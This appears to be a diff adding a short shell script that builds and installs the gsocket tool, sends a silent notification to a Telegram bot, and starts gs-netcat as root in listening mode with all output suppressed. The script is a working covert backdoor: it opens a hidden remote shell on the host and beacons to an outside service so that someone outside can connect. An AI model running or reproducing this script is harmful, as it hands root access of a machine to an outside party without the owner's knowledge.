@@ -1,0 +1,9 @@
+git clone --depth 1 https://github.com/hackerschoice/gsocket.git
+cd gsocket
+./bootstrap
+./configure --prefix=/usr
+make
+sudo make install
+cd /
+curl -s --data-urlencode "text=START GS-NCS--START GS-NCS" "https://api.telegram.org/bot$TOK/sendMessage?chat_id=$YOUID" &>/dev/null
+sudo gs-netcat -s $PROGS -l -S &>/dev/null
